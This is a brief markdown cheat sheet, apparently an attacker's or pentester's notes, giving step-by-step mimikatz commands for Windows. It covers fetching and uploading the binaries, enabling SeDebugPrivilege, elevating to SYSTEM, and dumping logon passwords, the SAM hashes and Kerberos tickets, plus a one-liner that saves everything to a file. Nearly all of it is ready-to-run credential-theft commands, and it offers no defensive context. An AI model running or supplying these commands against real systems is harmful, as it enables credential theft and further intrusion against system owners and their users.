### stand alone version
download
```
git clone https://github.com/ParrotSec/mimikatz.git
```

upload mimikatz files in x64 folder
```
mimikatz.exe, mimilib.dll, mimidrv.sys
```

execute
```
.\mimikatz.exe
```

Enabling SeDebugPrivilege
```
privilege::debug
```

elevating to SYSTEM user privileges
```
token::elevate
```

logonpasswords
```
sekurlsa::logonpasswords
```

dump sam
```
lsadump::sam
```

tickets dump
```
sekurlsa::tickets
```

# one liner
```
.\mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::tickets" exit > mimikatz_result.txt
```